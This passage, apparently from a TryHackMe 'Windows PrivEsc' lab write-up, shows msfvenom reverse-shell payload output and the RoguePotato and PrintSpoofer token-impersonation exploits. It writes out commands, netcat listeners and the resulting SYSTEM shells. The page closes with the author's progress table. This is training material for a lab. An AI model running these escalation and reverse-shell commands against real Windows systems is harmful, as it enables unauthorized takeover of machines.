[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: reverse2.exe
```

```bash
:~/WindowsPrivEsc# ls
reverse2.exe  reverse.exe  reverse.msi
```

```bash
C:\Windows\system32>C:\PrivEsc\RoguePotato.exe -r xx.xx.xxx.xx -e "C:\PrivEsc\reverse2.exe" -l 9999
C:\PrivEsc\RoguePotato.exe -r xx.xx.xxx.xx-e "C:\PrivEsc\reverse2.exe" -l 9999
[+] Starting RoguePotato...
[*] Creating Rogue OXID resolver thread
[*] Creating Pipe Server thread..
[*] Creating TriggerDCOM thread...
[*] Listening on pipe \\.\pipe\RoguePotato\pipe\epmapper, waiting for client to connect
[*] Calling CoGetInstanceFromIStorage with CLSID:{4991d34b-80a1-4291-83b6-3328366b9097}
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
[*] IStoragetrigger written:106 bytes
[*] SecurityCallback RPC call
[*] ServerAlive2 RPC Call
[*] SecurityCallback RPC call
[*] ResolveOxid2 RPC call, this is for us!
[*] ResolveOxid2: returned endpoint binding information = ncacn_np:localhost/pipe/RoguePotato[\pipe\epmapper]
[*] Client connected!
[+] Got SYSTEM Token!!!
[*] Token has SE_ASSIGN_PRIMARY_NAME, using CreateProcessAsUser() for launching: C:\PrivEsc\reverse2.exe
[+] RoguePotato gave you the SYSTEM powerz :D
```

<br>
<h2>Task 17 . 𝗧𝗼𝗸𝗲𝗻 𝗜𝗺𝗽𝗲𝗿𝘀𝗼𝗻𝗮𝘁𝗶𝗼𝗻 - PrintSpoofer<a id='17'></h2>
<p>Start a listener on Kali. Simulate getting a service account shell by logging into RDP as the admin user, starting an elevated command prompt (right-click -> run as administrator) and using PSExec64.exe to trigger the reverse.exe executable you created with the permissions of the "local service" account:<br>

<code>C:\PrivEsc\PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe</code><br>

Start another listener on Kali.<br>

Now, in the "local service" reverse shell you triggered, run the PrintSpoofer exploit to trigger a second reverse shell running with SYSTEM privileges (update the IP address with your Kali IP accordingly):<br>

<code>C:\PrivEsc\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i</code></p>

<p><em>Answer the questions below</em></p>

<p>17.1.  Read and follow along with the above.<br>
<code>No answer needed</code></p>

```bash
:~/WindowsPrivEsc# nc -nlvp 4444
Listening on 0.0.0.0 4444
```

```bash
C:\PrivEsc>PSExec64.exe -i -u "NT AUTHORITY\local service" C:\PrivEsc\reverse.exe
```

<img width="1168" height="664" alt="image" src="https://github.com/user-attachments/assets/24a154c0-031f-4b8e-941f-2de9b95b7506" />

```bash
:~/WindowsPrivEsc# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.151.241 49876
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

```bash
:~/WindowsPrivEsc# nc -nlvp 1337
Listening on 0.0.0.0 1337
```

```bash
C:\PrivEsc>PrintSpoofer.exe -c "C:\PrivEsc\reverse2.exe" -i
```

```bash
:~/WindowsPrivEsc# nc -nlvp 1337
Listening on 0.0.0.0 1337
Connection received on 10.10.151.241 49896
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State  
========================================= ================================================================== =======
SeCreateTokenPrivilege                    Create a token object                                              Enabled
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Enabled
```


<img width="1247" height="770" alt="image" src="https://github.com/user-attachments/assets/b7f66d7a-560f-499f-9528-7daa3f1870bb" />


<br>
<h2>Task 18 . Privilege Escalation Scripts<a id='18'></h2>
<p>Several tools have been written which help find potential privilege escalations on Windows. Four of these tools have been included on the Windows VM in the C:\PrivEsc directory:<br>

- winPEASany.exe<br>
- Seatbelt.exe<br>
- PowerUp.ps1<br>
- SharpUp.exe</p>

<p>18.1. Experiment with all four tools, running them with different options. Do all of them identify the techniques used in this room?<br>
<code>No answer needed</code></p>

<br>
<br>
<br>
<h1 align="center">In Progress</h1>
<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/b33e6ed9-3d2a-4fa2-8c5b-9fe9997a3240"><br>
                  <img width="1200px" src="https://github.com/user-attachments/assets/9bd8a72f-36e4-420c-afe1-7be6e9c9a585"></p>

<h1 align="center">My TryHackMe Journey ・ 2025, October</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|21      |Medium 🔗 - Windows PrivEsc            | 533    |      87ᵗʰ    |      4ᵗʰ     |      88ᵗʰ    |     2ⁿᵈ    | 131,737  |  1,011    |    79     |
|20      |Hard 🚩 - Enterprise                   | 532    |      87ᵗʰ    |      4ᵗʰ     |      81ˢᵗ    |     2ⁿᵈ    | 131,729  |  1,010    |    79     |
|19      |Hard 🚩 - Misguided Ghosts             | 531    |      87ᵗʰ    |      4ᵗʰ     |      77ᵗʰ    |     2ⁿᵈ    | 131,661  |  1,009    |    79     |
|18      |Hard 🚩 - Year of the Pig              | 530    |      89ᵗʰ    |      4ᵗʰ     |      72ⁿᵈ    |     2ⁿᵈ    | 131,531  |  1,008    |    79     |
|18      |Easy 🚩 - The Phishing Pond            | 530    |      90ᵗʰ    |      4ᵗʰ     |      74ᵗʰ    |     2ⁿᵈ    | 131,501  |  1,007    |    79     |
|17      |Hard 🚩 - Initial Access Pot           | 529    |      90ᵗʰ    |      4ᵗʰ     |      68ᵗʰ    |     2ⁿᵈ    | 131,456  |  1,006    |    79     |
|17      |Medium 🔗 - AllSignsPoint2Pwnage       | 529    |      90ᵗʰ    |      4ᵗʰ     |      87ᵗʰ    |     2ⁿᵈ    | 131,186  |  1,005    |    79     |
|16      |Easy 🔗 - Network Traffic Basics       | 528    |      90ᵗʰ    |      4ᵗʰ     |      89ᵗʰ    |     2ⁿᵈ    | 131,138  |  1,004    |    79     |
|16      |Medium 🔗 - Linux Threat Detection 3   | 528    |      90ᵗʰ    |      4ᵗʰ     |      89ᵗʰ    |     2ⁿᵈ    | 131,066  |  1,003    |    79     |
|13      |Hard 🚩 - M4tr1x: Exit Denied          | 525    |      92ⁿᵈ    |      4ᵗʰ     |      76ᵗʰ    |     2ⁿᵈ    | 130,938  |  1,002    |    79     |
|12      |Easy 🔗 - Atlas                        | 524    |     101ˢᵗ    |      4ᵗʰ     |     251ˢᵗ    |     3ʳᵈ    | 129,902  |  1,001    |    76     |
|11      |Easy 🔗 - Brute Force Heroes           | 523    |     101ˢᵗ    |      4ᵗʰ     |     217ᵗʰ    |     3ʳᵈ    | 129,878  |  1,000    |    76     |
|11      |Hard 🚩 - Rocket                       | 523    |     102ⁿᵈ    |      4ᵗʰ     |     211ˢᵗ    |     3ʳᵈ    | 129,870  |    999    |    76     |
|10      |Easy 🚩 - Shadow Trace                 | 522    |     101ˢᵗ    |      4ᵗʰ     |     159ᵗʰ    |     3ʳᵈ    | 129,810  |    998    |    76     |
|10      |Easy 🔗 - Defensive Security Intro     | 522    |     103ʳᵈ    |      4ᵗʰ     |     357ᵗʰ    |     3ʳᵈ    | 129,405  |    997    |    76     |
|10      |Easy 🔗 - 25 Days of Cyber Security, Day 2| 522|      103ʳᵈ    |      4ᵗʰ     |     355ᵗʰ    |     3ʳᵈ    | 129,405  |    996    |    76     |
|9       |Medium 🔗 - Linux Threat Detection 2   | 521    |     103ʳᵈ    |      4ᵗʰ     |     326ᵗʰ    |     3ʳᵈ    | 129,373  |    996    |    76     |
|9       |Medium 🚩 - WWBuddy                    | 521    |     103ʳᵈ    |      4ᵗʰ     |     390ᵗʰ    |     4ᵗʰ    | 129,293  |    995    |    76     |
|8       |Hard 🚩 - Motunui                      | 520    |     103ʳᵈ    |      4ᵗʰ     |     383ʳᵈ    |     4ᵗʰ    | 129,201  |    994    |    76     |
|8       |Easy 🔗 - Man-in-the-Middle            | 520    |     103ʳᵈ    |      4ᵗʰ     |     390ᵗʰ    |     4ᵗʰ    | 129,141  |    993    |    76     |
|7       |Medium 🚩 - Profiles, in progress      | 519    |              |              |              |            | 129,021  |    992    |    76     |
|6       |Medium 🚩 - VulnNet                    | 518    |     105ᵗʰ    |      4ᵗʰ     |     348ᵗʰ    |     5ᵗʰ    | 129,021  |    992    |    76     |
|6       |Easy 🚩 - DearQA                       | 518    |     105ᵗʰ    |      4ᵗʰ     |     333ʳᵈ    |     6ᵗʰ    | 128,991  |    991    |    76     |
|5       |Medium 🚩 - Frank & Herby try again.....| 517   |     106ᵗʰ    |      4ᵗʰ     |     300ᵗʰ    |     5ᵗʰ    | 128,931  |    990    |    76     |
|4       |Medium 🚩 - Frank & Herby make an app  | 516    |     105ᵗʰ    |      4ᵗʰ     |     233ʳᵈ    |     3ʳᵈ    | 128,871  |    989    |    76     |
|4       |Info ℹ️ - OverlayFS - CVE-2021-3493    | 516    |     105ᵗʰ    |      4ᵗʰ     |     235ᵗʰ    |     3ʳᵈ    | 128,841  |    988    |    76     |
|3       |Medium 🚩 - XDR: Operation Global Dagger2| 515  |     104ᵗʰ    |      4ᵗʰ     |     149ᵗʰ    |     3ʳᵈ    | 128,833  |    987    |    76     |
|3       |Medium 🚩 - VulnNet: dotpy             | 515    |     108ᵗʰ    |      4ᵗʰ     |     741ˢᵗ    |    11ˢᵗ    | 128,563  |    986    |    76     |
|2       |Medium 🔗 - Data Exfiltration Detection| 514    |     108ᵗʰ    |      4ᵗʰ     |     521ˢᵗ    |     8ᵗʰ    | 128,503  |    985    |    76     |
|1       |Medium 🔗 - Network Discovery Detection| 513    |     108ᵗʰ    |      4ᵗʰ     |     875ᵗʰ    |     7ᵗʰ    | 128,407  |    984    |    76     |
|1       |Medium 🚩 - Intranet                   | 513    |     108ᵗʰ    |      4ᵗʰ     |    3,357ᵗʰ   |    57ᵗʰ    | 128,335  |    983    |    76     |

</h6></div>

<br>

<p align="center">Global All Time:   87ᵗʰ<br><img width="250px" src="https://github.com/user-attachments/assets/ff23cd8b-e608-4be7-bd36-f359df9d3f30"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/a73135d7-b4d9-483b-8655-364d2e5248f5"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/d6eac27f-709b-4f7d-bbbc-adf4d47490f4"><br>
                  Global monthly:     88ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/aec49fd3-f5af-4c07-bdee-85eb3035ea2c"><br>
                  Brazil monthly:      2ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/6e73178d-116f-40d2-a6a5-e786a4d51399"></p>


<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
